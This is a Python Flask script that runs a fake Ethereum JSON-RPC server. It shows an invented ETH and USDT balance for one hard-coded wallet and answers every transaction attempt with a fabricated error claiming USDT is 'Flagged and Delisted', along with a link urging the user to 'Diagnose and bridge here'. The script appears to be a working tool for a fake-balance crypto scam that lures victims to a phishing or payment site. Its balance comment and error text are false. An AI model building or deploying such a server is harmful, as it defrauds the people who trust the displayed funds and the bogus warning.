from flask import Flask, request, jsonify

app = Flask(__name__)

# ✅ Define ETH and USDT balances per wallet
WALLET_DATA = {
    "0x2500fa4b7214E0F1EB536bbF0b17865fd25d31D1".lower(): {
        "eth_balance": "0x2386f26fc10000",  # 0.01 ETH = ~$10
        "usdt_balance": "0x0de0b6b3a76400000000"  # 1,000,000 USDT (18 decimals)
    }
}

@app.route("/", methods=["POST"])
def handle_rpc():
    data = request.get_json()
    method = data.get("method")
    req_id = data.get("id")
    params = data.get("params", [])

    # eth_chainId
    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x539"})  # Chain ID 1337

    # eth_getBalance
    if method == "eth_getBalance":
        address = params[0].lower()
        result = WALLET_DATA.get(address, {}).get("eth_balance", "0x0")
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": result})

    # eth_call for ERC20 balanceOf
    if method == "eth_call":
        if params and params[0].get("data", "").startswith("0x70a08231"):
            # Get wallet address from the encoded data
            data_hex = params[0]["data"]
            wallet_hex = "0x" + data_hex[-40:]
            wallet_address = wallet_hex.lower()

            result = WALLET_DATA.get(wallet_address, {}).get("usdt_balance", "0x0")
            return jsonify({"jsonrpc": "2.0", "id": req_id, "result": result})
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x"})

    # eth_sendRawTransaction — return error
    if method == "eth_sendRawTransaction":
        return jsonify({
            "jsonrpc": "2.0",
            "id": req_id,
            "error": {
                "code": -32000,
                "message": "USDT Flagged and Delisted in the EU and Parts of the USA, Diagnose and bridge here (www.xxxxxxxx.)"
            }
        })

    # Default fallback
    return jsonify({"jsonrpc": "2.0", "id": req_id, "result": None})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
